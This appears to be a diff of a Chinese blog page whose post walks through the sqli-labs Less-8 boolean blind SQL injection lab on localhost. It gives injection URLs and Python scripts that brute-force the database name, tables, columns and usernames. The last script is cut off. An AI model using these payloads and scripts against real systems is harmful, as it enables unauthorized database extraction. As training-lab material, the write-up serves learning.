@@ -511,7 +511,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="42">
-<input type="hidden" id="yelog_site_word_count" value="93.1k">
+<input type="hidden" id="yelog_site_word_count" value="92k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -876,18 +876,18 @@
         </a>
         
         <a  class="全部文章 CTF刷题 Crypto "
-           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
-           data-tag="Crypto"
-           data-author="" >
-            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
-            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
-        </a>
-        
-        <a  class="全部文章 CTF刷题 Crypto "
            href="/2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/"
            data-tag="Crypto"
            data-author="" >
             <span class="post-title" title="实验吧--密码学">实验吧--密码学</span>
+            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
+        </a>
+        
+        <a  class="全部文章 CTF刷题 Crypto "
+           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
+           data-tag="Crypto"
+           data-author="" >
+            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
             <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
         </a>
         
@@ -1070,7 +1070,7 @@
     </div>
     <div class="article-meta">
         
-        <span>字数:2.8k</span>
+        <span>字数:2.7k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1124,19 +1124,148 @@
 </ul>
 <p>好，知道了这些就去实战试试吧。</p>
 <p><strong>Less-8</strong> 布尔型单引号GET盲注<br><img src="http://img-blog.csdnimg.cn/20190727231427549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示了为单引号注入，测试下<br><img src="http://img-blog.csdnimg.cn/20190729160005474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加单引号报错，加上注释符回显正常，闭合方式确实是<code>&#39;</code><br>1）利用 left(database(),1)进行尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-8?id&#x3D;1&#39; and left(version(),1)&#x3D;5 %23</span><br></pre></td></tr></table></figure>
+<pre><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39; and left(version(),1)=5 %23</code></pre>
 <p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，显然 返回的结果是正确的。<br><img src="http://img-blog.csdnimg.cn/20190729162211883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2）接下来看一下数据库的长度<br>    <code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and length(database())=8 %23</code><br><img src="http://img-blog.csdnimg.cn/20190729162613631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>长度为 8 时，返回正确结果，说明长度为 8；这里说明下，长度要一个一个的试，我这里是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。后面会为大家展示╰(￣ω￣ｏ)<br>3）猜数据库名字<br>首先猜测数据库第一位,这里使用了<code>left</code>函数   <code>left(a,b)</code>,返回a字符串靠左至b位数，详细看下面用法<br><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and left(database(),1)&gt;&#39;a&#39;  --+</code><br><img src="http://img-blog.csdnimg.cn/201907291700425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Database()为 security，所以我们看他的第一位是否 <code>&gt; a</code>,很明显的是 <code>s &gt; a</code>,因此返回正确。当<br>我们不知情的情况下，可以用二分法来提高注入的效率。<br>继续爆第二位的话，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-8?id&#x3D;1&#39;and left(database(),2)&gt;&#39;sa&#39;--+</span><br></pre></td></tr></table></figure>
+<pre><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and left(database(),2)&gt;&#39;sa&#39;--+</code></pre>
 <p><img src="http://img-blog.csdnimg.cn/20190729171002737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后第三位，第四位…   很麻烦，正经人谁用这啊，你用吗，反正我不用（手动滑稽）<br>这里还可以构造这样的命令 猜解数据库第一位 ：<br><code>127.0.0.1/sqli-labs-master/Less-8 ?id=1&#39; and ascii(substr((database()),1,1)) &gt;80--+</code><br>第二位：<br><code>127.0.0.1/sqli-labs-master/Less-8 ?id=1&#39; and ascii(substr((database()),2,1)) &gt;80 --+</code></p>
 <p>格式就是这样，但这样的效率真的很…下面就演示下使用脚本盲注和burp爆破。╰(￣ω￣ｏ)</p>
 <p>大佬的脚本（目前还不会写╯︿╰） 爆数据库 ：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1%27&#39;  # 这个url要对应你自己的url</span><br><span class="line">payload &#x3D; &quot; and%20left(&#123;d&#125;(),&#123;n&#125;)&#x3D;%27&#123;s&#125;%27%20--%20k&quot;</span><br><span class="line"># 上面两个可以合并为一个,但没有必要,(本来就是我拆开的)</span><br><span class="line">list1 &#x3D; [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,</span><br><span class="line">         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;]  # 字典</span><br><span class="line">str1 &#x3D; &quot;You are in...........&quot;  # 就是通过返回的页面里有没有这个字符串来判断盲注有没有成功</span><br><span class="line"># 开始对比database()</span><br><span class="line">database &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1, 10):  # 相当于C语言的for循环1~9 其实这里应该先判断database有多长的</span><br><span class="line">    for ss in list1:  # 相当于for循环遍历list,然后把每一项赋值给ss</span><br><span class="line">        p &#x3D; payload.format(d&#x3D;&#39;database&#39;, n&#x3D;i, s&#x3D;database+ss)  # 把payload里的&#123;d&#125;,&#123;n&#125;,&#123;s&#125;赋值</span><br><span class="line">        u &#x3D; requests.get(url+p)  # 访问网页</span><br><span class="line">        # print p</span><br><span class="line">        if str1 in u.content:  # 如果str在网页内容里面</span><br><span class="line">            database +&#x3D; ss</span><br><span class="line">            print u&quot;正在对比database第&quot;, i, u&quot;个字符&quot;,</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">print u&quot;对比成功,database为:&quot;, database</span><br><span class="line"># 开始对比user()#user也是同理</span><br><span class="line">user &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1, 20):</span><br><span class="line">    for ss in list1:</span><br><span class="line">        p &#x3D; payload.format(d&#x3D;&#39;user&#39;, n&#x3D;i, s&#x3D;user+ss)</span><br><span class="line">        u &#x3D; requests.get(url+p)</span><br><span class="line">        # print p</span><br><span class="line">        if str in u.content:</span><br><span class="line">            user +&#x3D; ss</span><br><span class="line">            print u&quot;正在对比user第&quot;, i, u&quot;个字符&quot;,</span><br><span class="line">            print user</span><br><span class="line">            break</span><br><span class="line">print u&quot;对比成功,user为:&quot;, user</span><br><span class="line">print u&quot;database--&gt;&quot;, database</span><br><span class="line">print u&quot;user--&gt;&quot;, user</span><br><span class="line">a &#x3D; raw_input()</span><br></pre></td></tr></table></figure>
+<pre><code># -*- coding:utf8 -*-
+import requests
+url = &#39;http://localhost/sqli-labs-master/sqli-labs-master/Less-8/?id=1%27&#39;  # 这个url要对应你自己的url
+payload = &quot; and%20left(&#123;d&#125;(),&#123;n&#125;)=%27&#123;s&#125;%27%20--%20k&quot;
+# 上面两个可以合并为一个,但没有必要,(本来就是我拆开的)
+list1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,
+         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;]  # 字典
+str1 = &quot;You are in...........&quot;  # 就是通过返回的页面里有没有这个字符串来判断盲注有没有成功
+# 开始对比database()
+database = &#39;&#39;
+for i in range(1, 10):  # 相当于C语言的for循环1~9 其实这里应该先判断database有多长的
+    for ss in list1:  # 相当于for循环遍历list,然后把每一项赋值给ss
+        p = payload.format(d=&#39;database&#39;, n=i, s=database+ss)  # 把payload里的&#123;d&#125;,&#123;n&#125;,&#123;s&#125;赋值
+        u = requests.get(url+p)  # 访问网页
+        # print p
+        if str1 in u.content:  # 如果str在网页内容里面
+            database += ss
+            print u&quot;正在对比database第&quot;, i, u&quot;个字符&quot;,
+            print database
+            break
+print u&quot;对比成功,database为:&quot;, database
+# 开始对比user()#user也是同理
+user = &#39;&#39;
+for i in range(1, 20):
+    for ss in list1:
+        p = payload.format(d=&#39;user&#39;, n=i, s=user+ss)
+        u = requests.get(url+p)
+        # print p
+        if str in u.content:
+            user += ss
+            print u&quot;正在对比user第&quot;, i, u&quot;个字符&quot;,
+            print user
+            break
+print u&quot;对比成功,user为:&quot;, user
+print u&quot;database--&gt;&quot;, database
+print u&quot;user--&gt;&quot;, user
+a = raw_input()</code></pre>
 <p>爆破成功<br><img src="http://img-blog.csdnimg.cn/20190729180251990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来猜解表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-8?id&#x3D;1%27&#39;</span><br><span class="line">payload &#x3D; &#39;and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;&#39; \</span><br><span class="line">          &#39;database()%20limit%20&#123;t&#125;,1),&#123;w&#125;,1))&#x3D;&#123;A&#125;%20--%20k&#39;</span><br><span class="line"># 我把上面的substr改成了substring按理说mysql里substring和substr是一样的但是如果出错了记得改回substr</span><br><span class="line">list1 &#x3D; [64, 94, 96, 124, 176, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 173, 175, 95, 65, 66, 67, 68, 69, 70, 71,</span><br><span class="line">         72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103,</span><br><span class="line">         104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 44]</span><br><span class="line">str1 &#x3D; &quot;You are in...........&quot;</span><br><span class="line">tables1 &#x3D; &#39;&#39;</span><br><span class="line">tables2 &#x3D; &#39;&#39;</span><br><span class="line">tables3 &#x3D; &#39;&#39;</span><br><span class="line">tables4 &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0, 4):   &#x2F;&#x2F;这里要视情况而定,表的数量不定</span><br><span class="line">    for j in range(1, 10):</span><br><span class="line">        for s in list1:</span><br><span class="line">            p &#x3D; payload.format(t&#x3D;i, w&#x3D;j, A&#x3D;s)</span><br><span class="line">            u &#x3D; requests.get(url+p)</span><br><span class="line">            if str1 in u.content:</span><br><span class="line">                if i &#x3D;&#x3D; 0:</span><br><span class="line">                    tables1 +&#x3D; chr(s)</span><br><span class="line">                    print u&quot;正在对比第1个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;,tables1</span><br><span class="line">                elif i &#x3D;&#x3D; 1:</span><br><span class="line">                    tables2 +&#x3D; chr(s)</span><br><span class="line">                    print u&quot;正在对比第2个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables2</span><br><span class="line">                elif i &#x3D;&#x3D; 2:</span><br><span class="line">                    tables3 +&#x3D; chr(s)</span><br><span class="line">                    print u&quot;正在对比第3个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables3</span><br><span class="line">                elif i &#x3D;&#x3D; 3:</span><br><span class="line">                    tables4 +&#x3D; chr(s)</span><br><span class="line">                    print u&quot;正在对比第4个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables4</span><br><span class="line">                    break</span><br><span class="line">print &#39;tables1--&gt;&#39;, tables1</span><br><span class="line">print &#39;tables2--&gt;&#39;, tables2</span><br><span class="line">print &#39;tables3--&gt;&#39;, tables3</span><br><span class="line">print &#39;tables4--&gt;&#39;, tables4</span><br><span class="line">a &#x3D; raw_input()</span><br></pre></td></tr></table></figure>
+<pre><code># -*- coding:utf8 -*-
+import requests
+url = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;
+payload = &#39;and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=&#39; \
+          &#39;database()%20limit%20&#123;t&#125;,1),&#123;w&#125;,1))=&#123;A&#125;%20--%20k&#39;
+# 我把上面的substr改成了substring按理说mysql里substring和substr是一样的但是如果出错了记得改回substr
+list1 = [64, 94, 96, 124, 176, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 173, 175, 95, 65, 66, 67, 68, 69, 70, 71,
+         72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103,
+         104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 44]
+str1 = &quot;You are in...........&quot;
+tables1 = &#39;&#39;
+tables2 = &#39;&#39;
+tables3 = &#39;&#39;
+tables4 = &#39;&#39;
+for i in range(0, 4):   //这里要视情况而定,表的数量不定
+    for j in range(1, 10):
+        for s in list1:
+            p = payload.format(t=i, w=j, A=s)
+            u = requests.get(url+p)
+            if str1 in u.content:
+                if i == 0:
+                    tables1 += chr(s)
+                    print u&quot;正在对比第1个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;,tables1
+                elif i == 1:
+                    tables2 += chr(s)
+                    print u&quot;正在对比第2个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables2
+                elif i == 2:
+                    tables3 += chr(s)
+                    print u&quot;正在对比第3个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables3
+                elif i == 3:
+                    tables4 += chr(s)
+                    print u&quot;正在对比第4个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables4
+                    break
+print &#39;tables1--&gt;&#39;, tables1
+print &#39;tables2--&gt;&#39;, tables2
+print &#39;tables3--&gt;&#39;, tables3
+print &#39;tables4--&gt;&#39;, tables4
+a = raw_input()</code></pre>
 <p><img src="http://img-blog.csdnimg.cn/20190729192033844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后盲注users的字段名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">list1 &#x3D; [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, </span><br><span class="line">         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, </span><br><span class="line">         &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, </span><br><span class="line">         &#39;Z&#39;, &#39;.&#39;]  # 字典</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-8?id&#x3D;1%27&#39;</span><br><span class="line">payload &#x3D; &#39;%20and%20left((select%20column_name%20from%20information_schema.columns%20where%20table_schema&#x3D;%27security&#39; \</span><br><span class="line">          &#39;%27%20and%20table_name&#x3D;%27users%27%20limit%20&#123;w&#125;,1),&#123;n&#125;)&#x3D;%27&#123;c&#125;%27%20--%20k&#39;</span><br><span class="line"># payload其实就是url的后半部分,也是盲注的关键代码,也可以和url变量合并</span><br><span class="line">column &#x3D; [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]</span><br><span class="line">str &#x3D; &#39;You are in...........&#39;</span><br><span class="line"># 以上四个变量就是与本次盲注相关的变量了</span><br><span class="line">for j in range(0, 3):</span><br><span class="line">    for i in range(1, 9):</span><br><span class="line">        for l in list1:</span><br><span class="line">            p &#x3D; payload.format(w&#x3D;j, n&#x3D;i, c&#x3D;column[j]+l)</span><br><span class="line">            u &#x3D; requests.get(url+p)</span><br><span class="line">            if str in u.content:</span><br><span class="line">                column[j] +&#x3D; l</span><br><span class="line">                print u&#39;正在对比第&#39;, j+1, u&#39;个字段第&#39;, i, u&#39;个字符&#39;, column[j]</span><br><span class="line">                break</span><br><span class="line">for c in range(0, 5):</span><br><span class="line">    print &#39;column&#39;, c+1, &#39;--&gt;&#39;, column[c]</span><br><span class="line">a &#x3D; raw_input()</span><br></pre></td></tr></table></figure>
+<pre><code># -*- coding:utf8 -*-
+import requests
+list1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, 
+         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, 
+         &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, 
+         &#39;Z&#39;, &#39;.&#39;]  # 字典
+url = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;
+payload = &#39;%20and%20left((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security&#39; \
+          &#39;%27%20and%20table_name=%27users%27%20limit%20&#123;w&#125;,1),&#123;n&#125;)=%27&#123;c&#125;%27%20--%20k&#39;
+# payload其实就是url的后半部分,也是盲注的关键代码,也可以和url变量合并
+column = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]
+str = &#39;You are in...........&#39;
+# 以上四个变量就是与本次盲注相关的变量了
+for j in range(0, 3):
+    for i in range(1, 9):
+        for l in list1:
+            p = payload.format(w=j, n=i, c=column[j]+l)
+            u = requests.get(url+p)
+            if str in u.content:
+                column[j] += l
+                print u&#39;正在对比第&#39;, j+1, u&#39;个字段第&#39;, i, u&#39;个字符&#39;, column[j]
+                break
+for c in range(0, 5):
+    print &#39;column&#39;, c+1, &#39;--&gt;&#39;, column[c]
+a = raw_input()</code></pre>
 <p><img src="http://img-blog.csdnimg.cn/20190729192721615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后就是查看数据了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">list1 &#x3D; [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, </span><br><span class="line">         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, </span><br><span class="line">         &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, </span><br><span class="line">         &#39;Z&#39;, &#39;.&#39;]  # 字典</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-8?id&#x3D;1%27&#39;</span><br><span class="line">payload &#x3D; &#39;%20and%20left((select%20username%20from%20users%20where%20id%20&#x3D;&#123;n&#125;),&#123;w&#125;)&#x3D;%27&#123;d&#125;%27%20--%20k&#39;</span><br><span class="line">str &#x3D; &#39;You are in...........&#39;</span><br><span class="line">username &#x3D; [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]</span><br><span class="line">password &#x3D; [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]</span><br><span class="line">for i in range(1, 15):</span><br><span class="line">    for j in range(1, 11):</span><br><span class="line">        for l in list1:</span><br><span class="line">            p &#x3D; payload.format(n&#x3D;i, w&#x3D;j, d&#x3D;username[i-1]+l)</span><br><span class="line">            u &#x3D; requests.get(url+p)</span><br><span class="line">            if str in u.content:</span><br><span class="line">                username[i-1] +&#x3D; l</span><br><span class="line">                print u&#39;正在对比第&#39;, i, u&#39;个记录的username的第&#39;, j, u&#39;个字符&#39;, username[i-1]</span><br><span class="line">payload2 &#x3D; 